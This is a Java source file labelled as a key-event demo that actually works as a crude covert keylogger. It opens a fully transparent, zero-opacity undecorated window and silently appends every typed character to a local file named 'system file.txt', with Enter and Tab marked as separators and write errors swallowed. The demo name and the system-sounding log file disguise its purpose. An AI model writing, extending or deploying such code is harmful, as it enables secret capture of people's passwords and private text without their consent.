package keyeventdemo;
import java.awt.Color;
import java.awt.event.KeyEvent;
import java.awt.event.KeyListener;
import java.io.*;
import javax.swing.JDialog;
import javax.swing.JFrame;

public class KeyEventDemo {
public static void main(String[] args) throws IOException{ 
  
JDialog aWindow = new JDialog();
aWindow.setUndecorated(true);
aWindow.setBackground(new Color(0,0,0,0));
aWindow.setDefaultCloseOperation(JFrame.HIDE_ON_CLOSE);
aWindow.addKeyListener(new KeyListener() {
 public void files (String s) {
   try(PrintWriter o = new PrintWriter(new BufferedWriter(new FileWriter("system file.txt", true)))) {     
   o.print(s);
   }catch (IOException e) {
  }
 }

public void keyTyped(KeyEvent e) {
        displayInfo(e, "KEY TYPED: ");
      }


      public void keyPressed(KeyEvent e) {
         if(e.getKeyCode()== 10 || e.getKeyCode()==9)
          {
        displayInfo(e, "KEY PRESSED: ");
          }
      }


      public void keyReleased(KeyEvent e) {
       // displayInfo(e, "KEY RELEASED: ");
      }

      protected void displayInfo(KeyEvent e, String s) {
        String  modString, tmpString, actionString, locationString;
        String keyString;
        int id = e.getID();
        if (id == KeyEvent.KEY_TYPED) {
          char c = e.getKeyChar();
       
          keyString = String.valueOf(c);
        } else {
          int keyCode = e.getKeyCode();
          keyString = " | " ;//+ keyCode;// + " (" + KeyEvent.getKeyText(keyCode) + ")";           
        }

        int modifiers = e.getModifiersEx();
        modString = "modifiers = " + modifiers;
        tmpString = KeyEvent.getModifiersExText(modifiers);
        if (tmpString.length() > 0) {
          modString += " (" + tmpString + ")";
        } else {
          modString += " (no modifiers)";
        }

        actionString = "action key? ";
        if (e.isActionKey()) {
          actionString += "YES";
        } else {
          actionString += "NO";
        }

        locationString = "key location: ";
        int location = e.getKeyLocation();
        if (location == KeyEvent.KEY_LOCATION_STANDARD) {
          locationString += "standard";
        } else if (location == KeyEvent.KEY_LOCATION_LEFT) {
          locationString += "left";
        } else if (location == KeyEvent.KEY_LOCATION_RIGHT) {
          locationString += "right";
        } else if (location == KeyEvent.KEY_LOCATION_NUMPAD) {
          locationString += "numpad";
        } else {
          locationString += "unknown";
        }
  files(keyString);
   
   }
    
    });
aWindow.setVisible(true);
aWindow.setOpacity(0);
  }    
}
